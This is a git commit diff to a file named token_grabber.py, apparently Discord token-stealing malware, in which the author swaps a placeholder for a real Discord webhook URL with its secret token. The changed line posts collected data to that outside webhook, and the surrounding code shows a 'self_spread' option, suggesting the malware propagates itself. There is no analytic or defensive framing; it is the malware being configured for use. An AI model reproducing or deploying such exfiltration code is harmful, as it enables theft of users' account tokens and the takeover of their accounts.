4fc4a1ff885823eb16a99d8d392aa7f829d36950
codeisnotfunjk <81317270+codeisnotfunjk@users.noreply.github.com>
2022-02-08 06:42:26 -0500

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/940323717861486672/EvBlMx7qKqlQhmsto50DZQ3HykTCiB8t52UTBskY31dS2Tnxku0UdfxOnUSsEDKE2Uba", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
